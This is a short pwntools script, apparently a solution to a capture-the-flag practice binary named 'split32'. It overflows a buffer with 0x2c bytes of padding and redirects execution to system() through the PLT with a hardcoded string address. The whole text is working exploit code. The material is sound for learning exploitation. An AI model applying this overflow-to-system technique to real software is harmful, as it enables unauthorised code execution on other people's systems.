from pwn import *
context.log_level = 'debug'
sh = process("./split32")
elf = ELF("./split32")

system_plt = elf.plt['system']
binsh = 0x0804A030
binls = 0x08048747

sh.recv()

# payload = flat(b'a' * 0x2c, system_plt, b'b'*4, binls)
payload = flat(b'a' * 0x2c, system_plt, b'b'*4, binsh)
sh.sendline(payload)
sh.recv()